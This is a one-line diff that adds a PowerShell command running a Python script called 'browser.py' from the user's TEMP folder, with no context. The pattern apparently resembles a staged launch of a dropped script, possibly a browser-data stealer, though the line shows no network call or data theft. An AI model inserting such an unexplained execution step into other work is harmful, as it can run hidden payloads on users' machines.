@@ -1,0 +1,1 @@
+powershell $Temp = $env:TEMP; $browser = "browser.py"; python $Temp\$browser
